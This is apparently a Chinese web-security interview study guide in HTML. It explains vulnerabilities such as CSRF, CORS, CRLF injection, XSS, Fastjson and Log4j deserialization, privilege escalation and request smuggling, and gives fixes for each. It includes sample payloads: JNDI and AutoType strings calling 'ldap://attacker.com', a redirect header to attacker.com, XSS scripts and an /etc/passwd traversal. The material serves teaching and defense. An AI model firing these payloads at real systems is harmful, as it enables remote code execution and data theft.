<code>&lt;script&gt;</code> 标签的跨域特性，允许网页从其他域获取数据。<br><strong>JSONP 劫持利用方式</strong>：<br>- <strong>劫持敏感数据</strong>：攻击者构造恶意页面，利用 JSONP 获取用户敏感信息，如账户余额、个人资料等。<br><strong>修复方案</strong>：<br>- <strong>禁用 JSONP</strong>：不使用 JSONP，改用 CORS 等安全的跨域请求方式。<br>- <strong>验证回调函数</strong>：严格验证回调函数名，防止被篡改。<br>- <strong>使用 HTTPS</strong>：通过 HTTPS 加密传输，防止中间人攻击。<br><strong>如何设计 CSRF Token</strong>：<br>- <strong>生成 Token</strong>：在服务器端生成随机的 CSRF Token，并与用户会话关联。<br>- <strong>嵌入 Token</strong>：在每个表单中嵌入该 Token，作为隐藏字段。<br>- <strong>验证 Token</strong>：在服务器端验证请求中的 Token 是否与会话中的一致。<br>- <strong>示例代码</strong>：<br>  - <strong>生成 Token</strong>（PHP）：<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_token&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">32</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>  - <strong>嵌入 Token</strong>（HTML）：<br>    <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php echo $_SESSION[&#x27;csrf_token&#x27;]; ?&gt;&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 其他表单字段 --&gt;</span></span><br><span class="line">&lt;/form </span><br></pre></td></tr></table></figure></h2><h3 id="CORS-原理、利用及修复？"><a href="#CORS-原理、利用及修复？" class="headerlink" title="CORS 原理、利用及修复？"></a><strong>CORS 原理、利用及修复？</strong></h3><h2 id="CORS-原理：跨域资源共享（CORS）是浏览器的一种安全机制，旨在限制一个网站的资源可以被其他域的网页所访问。默认情况下，浏览器不允许从不同源加载资源，除非服务器在响应头中设置了-Access-Control-Allow-Origin，指定哪些域名可以访问该资源。利用方式：攻击者可以通过构造恶意网页，诱使用户访问攻击者的站点，利用目标站点的-CORS-漏洞，窃取敏感数据。例如：-攻击者站点通过-请求目标站点，若目标站点未正确配置-CORS，攻击者可窃取数据。修复方案：-配置严格的-CORS-策略：只允许特定的来源域名访问资源：-使用预检请求：启用-OPTIONS-请求，确保请求的安全性。"><a href="#CORS-原理：跨域资源共享（CORS）是浏览器的一种安全机制，旨在限制一个网站的资源可以被其他域的网页所访问。默认情况下，浏览器不允许从不同源加载资源，除非服务器在响应头中设置了-Access-Control-Allow-Origin，指定哪些域名可以访问该资源。利用方式：攻击者可以通过构造恶意网页，诱使用户访问攻击者的站点，利用目标站点的-CORS-漏洞，窃取敏感数据。例如：-攻击者站点通过-请求目标站点，若目标站点未正确配置-CORS，攻击者可窃取数据。修复方案：-配置严格的-CORS-策略：只允许特定的来源域名访问资源：-使用预检请求：启用-OPTIONS-请求，确保请求的安全性。" class="headerlink" title="CORS 原理：跨域资源共享（CORS）是浏览器的一种安全机制，旨在限制一个网站的资源可以被其他域的网页所访问。默认情况下，浏览器不允许从不同源加载资源，除非服务器在响应头中设置了 Access-Control-Allow-Origin，指定哪些域名可以访问该资源。利用方式：攻击者可以通过构造恶意网页，诱使用户访问攻击者的站点，利用目标站点的 CORS 漏洞，窃取敏感数据。例如：- 攻击者站点通过 &lt;script src=&quot;http://target.com/sensitive-data&quot;&gt; 请求目标站点，若目标站点未正确配置 CORS，攻击者可窃取数据。修复方案：- 配置严格的 CORS 策略：只允许特定的来源域名访问资源：  - 使用预检请求：启用 OPTIONS 请求，确保请求的安全性。"></a><strong>CORS 原理</strong>：<br>跨域资源共享（CORS）是浏览器的一种安全机制，旨在限制一个网站的资源可以被其他域的网页所访问。默认情况下，浏览器不允许从不同源加载资源，除非服务器在响应头中设置了 <code>Access-Control-Allow-Origin</code>，指定哪些域名可以访问该资源。<br><strong>利用方式</strong>：<br>攻击者可以通过构造恶意网页，诱使用户访问攻击者的站点，利用目标站点的 CORS 漏洞，窃取敏感数据。例如：<br>- 攻击者站点通过 <code>&lt;script src=&quot;http://target.com/sensitive-data&quot;&gt;</code> 请求目标站点，若目标站点未正确配置 CORS，攻击者可窃取数据。<br><strong>修复方案</strong>：<br>- <strong>配置严格的 CORS 策略</strong>：只允许特定的来源域名访问资源：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://trusted-site.com</span><br></pre></td></tr></table></figure><br>- <strong>使用预检请求</strong>：启用 <code>OPTIONS</code> 请求，确保请求的安全性。</h2><h3 id="CRLF-注入原理？"><a href="#CRLF-注入原理？" class="headerlink" title="CRLF 注入原理？"></a><strong>CRLF 注入原理？</strong></h3><h2 id="漏洞原理：CRLF（Carriage-Return-Line-Feed）注入漏洞发生在攻击者向-HTTP-响应中插入非法的换行符-r-n，以破坏服务器对响应的处理，从而影响-HTTP-头的解析。攻击者可以插入恶意内容，如注入-HTTP-响应头，进行重定向、跨站脚本攻击（XSS）等。利用方式：-HTTP-头注入：攻击者可以通过-CRLF-注入，在响应中插入额外的头部，例如重定向：-修复方案：-输入验证：过滤所有输入，防止用户提交非法的换行符或回车符。-HTTP-头规范化：确保所有-HTTP-头遵循标准格式，避免不必要的字符插入。"><a href="#漏洞原理：CRLF（Carriage-Return-Line-Feed）注入漏洞发生在攻击者向-HTTP-响应中插入非法的换行符-r-n，以破坏服务器对响应的处理，从而影响-HTTP-头的解析。攻击者可以插入恶意内容，如注入-HTTP-响应头，进行重定向、跨站脚本攻击（XSS）等。利用方式：-HTTP-头注入：攻击者可以通过-CRLF-注入，在响应中插入额外的头部，例如重定向：-修复方案：-输入验证：过滤所有输入，防止用户提交非法的换行符或回车符。-HTTP-头规范化：确保所有-HTTP-头遵循标准格式，避免不必要的字符插入。" class="headerlink" title="漏洞原理：CRLF（Carriage Return Line Feed）注入漏洞发生在攻击者向 HTTP 响应中插入非法的换行符 \r\n，以破坏服务器对响应的处理，从而影响 HTTP 头的解析。攻击者可以插入恶意内容，如注入 HTTP 响应头，进行重定向、跨站脚本攻击（XSS）等。利用方式：- HTTP 头注入：攻击者可以通过 CRLF 注入，在响应中插入额外的头部，例如重定向：  修复方案：- 输入验证：过滤所有输入，防止用户提交非法的换行符或回车符。- HTTP 头规范化：确保所有 HTTP 头遵循标准格式，避免不必要的字符插入。"></a><strong>漏洞原理</strong>：<br>CRLF（Carriage Return Line Feed）注入漏洞发生在攻击者向 HTTP 响应中插入非法的换行符 <code>\r\n</code>，以破坏服务器对响应的处理，从而影响 HTTP 头的解析。攻击者可以插入恶意内容，如注入 HTTP 响应头，进行重定向、跨站脚本攻击（XSS）等。<br><strong>利用方式</strong>：<br>- <strong>HTTP 头注入</strong>：攻击者可以通过 CRLF 注入，在响应中插入额外的头部，例如重定向：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>sessionid=malicious_value; path=/; HttpOnly</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://attacker.com/malicious</span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- <strong>输入验证</strong>：过滤所有输入，防止用户提交非法的换行符或回车符。<br>- <strong>HTTP 头规范化</strong>：确保所有 HTTP 头遵循标准格式，避免不必要的字符插入。</h2><h3 id="URL-白名单如何绕过？"><a href="#URL-白名单如何绕过？" class="headerlink" title="URL 白名单如何绕过？"></a><strong>URL 白名单如何绕过？</strong></h3><h2 id="漏洞原理：URL-白名单常用于限制用户请求的目标地址，只允许特定的域名或路径。攻击者可以通过某些技术绕过白名单，发起恶意请求。常见的绕过方式包括：-使用-URL-编码：如-http-example-com-2F-2E-2E-2F（通过-URL-编码绕过路径限制）。-使用-localhost-或-127-0-0-1-地址直接访问内网服务。利用方式：-路径绕过：攻击者通过-URL-编码或使用-DNS-重绑定，绕过域名限制：-修复方案：-严格白名单规则：验证请求的域名和路径，确保只允许明确的合法地址。-DNS-检查：验证-URL-的-DNS-解析结果，确保目标地址的-IP-属于可信范围。"><a href="#漏洞原理：URL-白名单常用于限制用户请求的目标地址，只允许特定的域名或路径。攻击者可以通过某些技术绕过白名单，发起恶意请求。常见的绕过方式包括：-使用-URL-编码：如-http-example-com-2F-2E-2E-2F（通过-URL-编码绕过路径限制）。-使用-localhost-或-127-0-0-1-地址直接访问内网服务。利用方式：-路径绕过：攻击者通过-URL-编码或使用-DNS-重绑定，绕过域名限制：-修复方案：-严格白名单规则：验证请求的域名和路径，确保只允许明确的合法地址。-DNS-检查：验证-URL-的-DNS-解析结果，确保目标地址的-IP-属于可信范围。" class="headerlink" title="漏洞原理：URL 白名单常用于限制用户请求的目标地址，只允许特定的域名或路径。攻击者可以通过某些技术绕过白名单，发起恶意请求。常见的绕过方式包括：- 使用 URL 编码：如 http://example.com%2F%2E%2E%2F（通过 URL 编码绕过路径限制）。- 使用 localhost 或 127.0.0.1 地址直接访问内网服务。利用方式：- 路径绕过：攻击者通过 URL 编码或使用 DNS 重绑定，绕过域名限制：  修复方案：- 严格白名单规则：验证请求的域名和路径，确保只允许明确的合法地址。- DNS 检查：验证 URL 的 DNS 解析结果，确保目标地址的 IP 属于可信范围。"></a><strong>漏洞原理</strong>：<br>URL 白名单常用于限制用户请求的目标地址，只允许特定的域名或路径。攻击者可以通过某些技术绕过白名单，发起恶意请求。常见的绕过方式包括：<br>- 使用 URL 编码：如 <code>http://example.com%2F%2E%2E%2F</code>（通过 URL 编码绕过路径限制）。<br>- 使用 <code>localhost</code> 或 <code>127.0.0.1</code> 地址直接访问内网服务。<br><strong>利用方式</strong>：<br>- <strong>路径绕过</strong>：攻击者通过 URL 编码或使用 DNS 重绑定，绕过域名限制：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://trusted-site.com/../../etc/passwd</span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- <strong>严格白名单规则</strong>：验证请求的域名和路径，确保只允许明确的合法地址。<br>- <strong>DNS 检查</strong>：验证 URL 的 DNS 解析结果，确保目标地址的 IP 属于可信范围。</h2><h3 id="XSS-如何实现？"><a href="#XSS-如何实现？" class="headerlink" title="XSS 如何实现？"></a><strong>XSS 如何实现？</strong></h3><h2 id="漏洞原理：跨站脚本（XSS）漏洞允许攻击者在受害者的浏览器中执行恶意脚本。攻击者通常通过输入框、URL-参数等位置注入-JavaScript-代码，导致浏览器执行不受信任的脚本，进而窃取用户数据或劫持会话。利用方式：-存储型-XSS：攻击者将恶意脚本存储在服务器端，用户访问时触发脚本执行：-反射型-XSS：攻击者通过-URL-注入恶意脚本，用户点击后触发：-修复方案：-输入输出编码：对所有用户输入进行严格的编码处理，避免将恶意脚本直接插入页面：-内容安全策略（CSP）：使用-Content-Security-Policy-响应头，限制可执行的脚本来源："><a href="#漏洞原理：跨站脚本（XSS）漏洞允许攻击者在受害者的浏览器中执行恶意脚本。攻击者通常通过输入框、URL-参数等位置注入-JavaScript-代码，导致浏览器执行不受信任的脚本，进而窃取用户数据或劫持会话。利用方式：-存储型-XSS：攻击者将恶意脚本存储在服务器端，用户访问时触发脚本执行：-反射型-XSS：攻击者通过-URL-注入恶意脚本，用户点击后触发：-修复方案：-输入输出编码：对所有用户输入进行严格的编码处理，避免将恶意脚本直接插入页面：-内容安全策略（CSP）：使用-Content-Security-Policy-响应头，限制可执行的脚本来源：" class="headerlink" title="漏洞原理：跨站脚本（XSS）漏洞允许攻击者在受害者的浏览器中执行恶意脚本。攻击者通常通过输入框、URL 参数等位置注入 JavaScript 代码，导致浏览器执行不受信任的脚本，进而窃取用户数据或劫持会话。利用方式：- 存储型 XSS：攻击者将恶意脚本存储在服务器端，用户访问时触发脚本执行：  - 反射型 XSS：攻击者通过 URL 注入恶意脚本，用户点击后触发：  修复方案：- 输入输出编码：对所有用户输入进行严格的编码处理，避免将恶意脚本直接插入页面：  - 内容安全策略（CSP）：使用 Content-Security-Policy 响应头，限制可执行的脚本来源：  "></a><strong>漏洞原理</strong>：<br>跨站脚本（XSS）漏洞允许攻击者在受害者的浏览器中执行恶意脚本。攻击者通常通过输入框、URL 参数等位置注入 JavaScript 代码，导致浏览器执行不受信任的脚本，进而窃取用户数据或劫持会话。<br><strong>利用方式</strong>：<br>- <strong>存储型 XSS</strong>：攻击者将恶意脚本存储在服务器端，用户访问时触发脚本执行：<br>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>- <strong>反射型 XSS</strong>：攻击者通过 URL 注入恶意脚本，用户点击后触发：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/search?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- <strong>输入输出编码</strong>：对所有用户输入进行严格的编码处理，避免将恶意脚本直接插入页面：<br>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user_input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br></pre></td></tr></table></figure><br>- <strong>内容安全策略（CSP）</strong>：使用 <code>Content-Security-Policy</code> 响应头，限制可执行的脚本来源：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>script-src &#x27;self&#x27; https://trusted-cdn.com;</span><br></pre></td></tr></table></figure></h2><h3 id="Fastjson、Log4j-常见漏洞原理？如何底层解决该漏洞？"><a href="#Fastjson、Log4j-常见漏洞原理？如何底层解决该漏洞？" class="headerlink" title="Fastjson、Log4j 常见漏洞原理？如何底层解决该漏洞？"></a><strong>Fastjson、Log4j 常见漏洞原理？如何底层解决该漏洞？</strong></h3><h2 id="Fastjson-漏洞原理：Fastjson-是一个-JSON-处理库，曾暴露出反序列化漏洞，攻击者可通过构造恶意-JSON-数据，利用-Fastjson-的自动类型转换功能，执行任意代码。此漏洞被称为-AutoType-漏洞。利用方式：-反序列化攻击：攻击者利用-Fastjson-的-AutoType-特性，发送恶意-JSON-数据，触发反序列化漏洞，从而执行恶意代码。-修复方案：-禁用-AutoType：禁用不必要的类型转换，避免反序列化恶意类型：-Log4j-漏洞原理：Log4j-是一款流行的-Java-日志框架，曾因-JNDI-查找功能导致远程代码执行（RCE）漏洞。攻击者利用特制的日志输入，通过-JNDI-远程加载恶意类，从而执行代码。利用方式：-JNDI-注入：攻击者发送恶意日志数据，触发-Log4j-向远程-JNDI-服务加载恶意类：-修复方案：-更新-Log4j-版本：立即升级到-Log4j-2-16-0-或更高版本，禁用-JNDI-查找功能。-禁用-JNDI：通过配置-Log4j-禁用-JNDI-查找："><a href="#Fastjson-漏洞原理：Fastjson-是一个-JSON-处理库，曾暴露出反序列化漏洞，攻击者可通过构造恶意-JSON-数据，利用-Fastjson-的自动类型转换功能，执行任意代码。此漏洞被称为-AutoType-漏洞。利用方式：-反序列化攻击：攻击者利用-Fastjson-的-AutoType-特性，发送恶意-JSON-数据，触发反序列化漏洞，从而执行恶意代码。-修复方案：-禁用-AutoType：禁用不必要的类型转换，避免反序列化恶意类型：-Log4j-漏洞原理：Log4j-是一款流行的-Java-日志框架，曾因-JNDI-查找功能导致远程代码执行（RCE）漏洞。攻击者利用特制的日志输入，通过-JNDI-远程加载恶意类，从而执行代码。利用方式：-JNDI-注入：攻击者发送恶意日志数据，触发-Log4j-向远程-JNDI-服务加载恶意类：-修复方案：-更新-Log4j-版本：立即升级到-Log4j-2-16-0-或更高版本，禁用-JNDI-查找功能。-禁用-JNDI：通过配置-Log4j-禁用-JNDI-查找：" class="headerlink" title="Fastjson 漏洞原理：Fastjson 是一个 JSON 处理库，曾暴露出反序列化漏洞，攻击者可通过构造恶意 JSON 数据，利用 Fastjson 的自动类型转换功能，执行任意代码。此漏洞被称为 AutoType 漏洞。利用方式：- 反序列化攻击：攻击者利用 Fastjson 的 AutoType 特性，发送恶意 JSON 数据，触发反序列化漏洞，从而执行恶意代码。  修复方案：- 禁用 AutoType：禁用不必要的类型转换，避免反序列化恶意类型：  Log4j 漏洞原理：Log4j 是一款流行的 Java 日志框架，曾因 JNDI 查找功能导致远程代码执行（RCE）漏洞。攻击者利用特制的日志输入，通过 JNDI 远程加载恶意类，从而执行代码。利用方式：- JNDI 注入：攻击者发送恶意日志数据，触发 Log4j 向远程 JNDI 服务加载恶意类：  修复方案：- 更新 Log4j 版本：立即升级到 Log4j 2.16.0 或更高版本，禁用 JNDI 查找功能。- 禁用 JNDI：通过配置 Log4j 禁用 JNDI 查找：  "></a><strong>Fastjson 漏洞原理</strong>：<br>Fastjson 是一个 JSON 处理库，曾暴露出反序列化漏洞，攻击者可通过构造恶意 JSON 数据，利用 Fastjson 的自动类型转换功能，执行任意代码。此漏洞被称为 <code>AutoType</code> 漏洞。<br><strong>利用方式</strong>：<br>- <strong>反序列化攻击</strong>：攻击者利用 Fastjson 的 <code>AutoType</code> 特性，发送恶意 JSON 数据，触发反序列化漏洞，从而执行恶意代码。<br>  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://attacker.com/malicious&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- <strong>禁用 AutoType</strong>：禁用不必要的类型转换，避免反序列化恶意类型：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><br><strong>Log4j 漏洞原理</strong>：<br>Log4j 是一款流行的 Java 日志框架，曾因 <code>JNDI</code> 查找功能导致远程代码执行（RCE）漏洞。攻击者利用特制的日志输入，通过 JNDI 远程加载恶意类，从而执行代码。<br><strong>利用方式</strong>：<br>- <strong>JNDI 注入</strong>：攻击者发送恶意日志数据，触发 Log4j 向远程 JNDI 服务加载恶意类：<br>  <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://attacker.com/malicious&#125;</span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- <strong>更新 Log4j 版本</strong>：立即升级到 Log4j 2.16.0 或更高版本，禁用 JNDI 查找功能。<br>- <strong>禁用 JNDI</strong>：通过配置 Log4j 禁用 JNDI 查找：<br>  <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">log4j2.formatMsgNoLookups</span>=<span class="string">true</span></span><br></pre></td></tr></table></figure></h2><h3 id="业务逻辑漏洞具体类型："><a href="#业务逻辑漏洞具体类型：" class="headerlink" title="业务逻辑漏洞具体类型："></a>业务逻辑漏洞具体类型：</h3><ul>
<li>身份校验相关风险：未授权访问、非正常账户状态、身份可枚举、水平越权、垂直越权等。</li>
<li>接口逻辑实现不一致：不同协议实现不一致、同类产品不同逻辑、不同阶段逻辑不一致-流程绕过。</li>
<li>不安全的可信端数据：APP数据被篡改或伪造。</li>
<li>预设要求不符合：依赖条件不安全-业务校验属性设计、人工客服容易被骗-业务流程设计。</li>
<li>滥用合理业务需求：如API速率限制被绕过、促销活动被恶意利用等。</li>
</ul>
<hr>
<h3 id="哪些账户状态会导致预期外的风险："><a href="#哪些账户状态会导致预期外的风险：" class="headerlink" title="哪些账户状态会导致预期外的风险："></a>哪些账户状态会导致预期外的风险：</h3><ul>
<li>注销账户仍可进行操作。</li>
<li>禁用账户绕过禁用逻辑。</li>
<li>风控账户执行敏感操作。</li>
<li>司法冻结账户进行资金转移。</li>
</ul>
<hr>
<h3 id="身份标识明文传输会导致的风险："><a href="#身份标识明文传输会导致的风险：" class="headerlink" title="身份标识明文传输会导致的风险："></a>身份标识明文传输会导致的风险：</h3><ul>
<li>身份盗用：攻击者可通过截获明文身份标识，伪装成其他用户。</li>
<li>会话劫持：攻击者可能通过明文身份标识接管用户会话。</li>
</ul>
<hr>
<h3 id="水平越权触发点会存在的位置："><a href="#水平越权触发点会存在的位置：" class="headerlink" title="水平越权触发点会存在的位置："></a>水平越权触发点会存在的位置：</h3><ul>
<li>Cookies：被恶意修改以访问其他用户会话。</li>
<li>自定义Header：如X-Custom-Header被利用进行越权访问。</li>
<li>URL Path：路径遍历或操作其他用户资源。</li>
<li>URL Param Value：参数值被修改以访问未授权资源。</li>
<li>URL Param JSON：JSON参数被篡改导致越权。</li>
<li>Body Form、Body JSON、Body XML：请求体中数据被篡改。</li>
<li>自定义协议的自定义字段：用于越权访问的隐藏参数。</li>
</ul>
<hr>
<h3 id="水平越权有哪几种检测方式："><a href="#水平越权有哪几种检测方式：" class="headerlink" title="水平越权有哪几种检测方式："></a>水平越权有哪几种检测方式：</h3><ul>
<li>枚举检测：对数字ID进行递增或递减测试。</li>
<li>账户互测：使用两个不同权限账户相互访问资源。</li>
</ul>
<hr>
<h3 id="通过数字加减遍历或通过两个账号互测的方式进行水平越权测试的优劣势："><a href="#通过数字加减遍历或通过两个账号互测的方式进行水平越权测试的优劣势：" class="headerlink" title="通过数字加减遍历或通过两个账号互测的方式进行水平越权测试的优劣势："></a>通过数字加减遍历或通过两个账号互测的方式进行水平越权测试的优劣势：</h3><ul>
<li>数字加减遍历：<ul>
<li>优势：直接针对数字型资源ID，操作简单。</li>
<li>劣势：只能检测连续数字ID，可能遗漏非连续或非数字ID的越权，且对业务有损。</li>
</ul>
</li>
<li>账号互测：<ul>
<li>优势：无需遍历，降低被发现风险，不会对他人数据产生影响。</li>
<li>劣势：配置多个账号测试较为繁琐，当参数多且相互关联时效率较低。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="CORS-原理、利用及修复？-1"><a href="#CORS-原理、利用及修复？-1" class="headerlink" title="CORS 原理、利用及修复？"></a>CORS 原理、利用及修复？</h3><p>CORS 原理：<br>跨域资源共享（CORS）是Web浏览器实现的一种安全机制，用于限制Web页面如何请求另一域名下的资源。其原理是通过在HTTP响应头中加入<code>Access-Control-Allow-Origin</code>字段来指定哪些外部域可以访问该资源。</p>
<p>利用方式：<br>攻击者可能利用不当配置的CORS策略，使得恶意网站能够访问或修改目标域下的敏感数据。</p>
<h2 id="修复方案：-配置严格的CORS策略，仅允许信任的源访问资源。-使用预检请求（OPTIONS请求），在实际请求之前进行权限校验。"><a href="#修复方案：-配置严格的CORS策略，仅允许信任的源访问资源。-使用预检请求（OPTIONS请求），在实际请求之前进行权限校验。" class="headerlink" title="修复方案：- 配置严格的CORS策略，仅允许信任的源访问资源。- 使用预检请求（OPTIONS请求），在实际请求之前进行权限校验。"></a>修复方案：<br>- 配置严格的CORS策略，仅允许信任的源访问资源。<br>- 使用预检请求（OPTIONS请求），在实际请求之前进行权限校验。</h2><h3 id="某个APP的某个功能按钮是灰色不可用状态，如何绕过其限制？"><a href="#某个APP的某个功能按钮是灰色不可用状态，如何绕过其限制？" class="headerlink" title="某个APP的某个功能按钮是灰色不可用状态，如何绕过其限制？"></a>某个APP的某个功能按钮是灰色不可用状态，如何绕过其限制？</h3><ul>
<li>修改前端按钮属性：直接修改前端页面元素的属性，使其可用。</li>
<li>分析后端接口：检查按钮对应的后端API，尝试直接调用接口以绕过前端限制。</li>
<li>多协议测试：尝试通过不同协议（HTTP、WSDL、REST、GraphQL）调用API，看是否能绕过限制。</li>
<li>跨平台测试：如果APP上按钮不可用，尝试在PC或其他平台上操作，看是否能绕过限制。</li>
</ul>
<hr>
<h3 id="流程绕过漏洞如何抽象理解归类？"><a href="#流程绕过漏洞如何抽象理解归类？" class="headerlink" title="流程绕过漏洞如何抽象理解归类？"></a>流程绕过漏洞如何抽象理解归类？</h3><ul>
<li>状态变更不一致：创建时权限校验严格，后续状态变更时权限要求不一致。</li>
<li>步骤要求不一致：流程中某个步骤要求严格，后续步骤要求不一致，如输入密码后未校验。</li>
<li>并发逻辑控制：并发执行流程，如多窗口同时支付，使优惠多次使用。</li>
<li>特殊时期逻辑绕过：如大促时期校验机制降级，导致流程绕过。</li>
<li>逻辑控制缺陷：开发中逻辑控制不严谨，如多条件判断中遗漏关键校验。</li>
</ul>
<hr>
<h3 id="TLS-1-2-协议交互过程以及攻击方法？"><a href="#TLS-1-2-协议交互过程以及攻击方法？" class="headerlink" title="TLS 1.2 协议交互过程以及攻击方法？"></a><strong>TLS 1.2 协议交互过程以及攻击方法？</strong></h3><p><strong>TLS 1.2 交互过程</strong>：</p>
<ol>
<li><strong>客户端 Hello</strong>：客户端向服务器发送支持的 TLS 版本、加密套件、随机数等。</li>
<li><strong>服务器 Hello</strong>：服务器选择 TLS 版本、加密算法，并返回自己的证书。</li>
<li><strong>密钥交换</strong>：基于 RSA 或 ECDHE 交换密钥，协商对称加密密钥。</li>
<li><strong>Finished</strong>：双方使用协商出的密钥完成握手，开始加密通信。</li>
</ol>
<p><strong>攻击方法</strong>：</p>
<ul>
<li><strong>TLS 降级攻击</strong>：攻击者干扰 TLS 握手，迫使客户端使用较低版本的 TLS（如 POODLE）。</li>
<li><strong>中间人攻击（MITM）</strong>：攻击者拦截并修改 TLS 握手，插入恶意 CA 证书，解密通信。</li>
<li><strong>会话劫持</strong>：通过窃取会话票据（Session Ticket）获取用户会话。</li>
<li><strong>BEAST 攻击</strong>：利用 CBC 模式填充漏洞，破解会话密文。</li>
</ul>
<h2 id="修复方案：-强制使用-TLS-1-2-，禁用低版本。-启用-HSTS，防止降级攻击。-使用-PFS（Perfect-Forward-Secrecy），防止密钥泄露影响历史数据。"><a href="#修复方案：-强制使用-TLS-1-2-，禁用低版本。-启用-HSTS，防止降级攻击。-使用-PFS（Perfect-Forward-Secrecy），防止密钥泄露影响历史数据。" class="headerlink" title="修复方案：- 强制使用 TLS 1.2+，禁用低版本。- 启用 HSTS，防止降级攻击。- 使用 PFS（Perfect Forward Secrecy），防止密钥泄露影响历史数据。"></a><strong>修复方案</strong>：<br>- 强制使用 TLS 1.2+，禁用低版本。<br>- 启用 HSTS，防止降级攻击。<br>- 使用 PFS（Perfect Forward Secrecy），防止密钥泄露影响历史数据。</h2><h3 id="HTTP-请求走私（HTTP-Request-Smuggling）原理"><a href="#HTTP-请求走私（HTTP-Request-Smuggling）原理" class="headerlink" title="HTTP 请求走私（HTTP Request Smuggling）原理"></a><strong>HTTP 请求走私（HTTP Request Smuggling）原理</strong></h3><p><strong>漏洞原理</strong>：<br>HTTP 请求走私是由于服务器对 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 解析不一致导致的漏洞，攻击者可以通过构造特殊的 HTTP 请求，使代理服务器和目标服务器解析不同步，导致：</p>
<ul>
<li>窃取其他用户的请求数据</li>
<li>绕过身份验证</li>
<li>触发缓存污染</li>
</ul>
